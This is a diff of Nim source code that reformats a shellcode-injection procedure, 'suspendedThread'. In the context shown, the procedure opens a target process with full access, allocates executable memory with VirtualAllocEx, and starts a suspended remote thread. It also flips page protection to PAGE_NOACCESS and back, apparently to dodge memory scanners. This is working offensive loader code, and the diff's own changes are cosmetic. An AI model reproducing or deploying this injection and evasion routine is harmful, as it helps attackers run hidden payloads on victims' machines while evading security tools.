@@ -11,11 +11,7 @@ proc suspendedThread[byte](shellcode: openArray[byte]): void =
   tProcess.suspend() # That's handy!
   defer: tProcess.close()
 
-  let pHandle = OpenProcess(
-    PROCESS_ALL_ACCESS, 
-    false, 
-    cast[DWORD](tProcess.processID)
-  )
+  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcess.processID))
   defer: CloseHandle(pHandle)
 
   let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
@@ -30,15 +26,7 @@ proc suspendedThread[byte](shellcode: openArray[byte]): void =
   )
 
   VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_NOACCESS, addr op)
-  let tHandle = CreateRemoteThread(
-    pHandle, 
-    NULL,
-    0,
-    cast[LPTHREAD_START_ROUTINE](rPtr),
-    NULL, 
-    0x00000004, 
-    NULL
-  )
+  let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0x00000004, NULL)
 
   sleep(1000)
   VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ_WRITE,addr op)
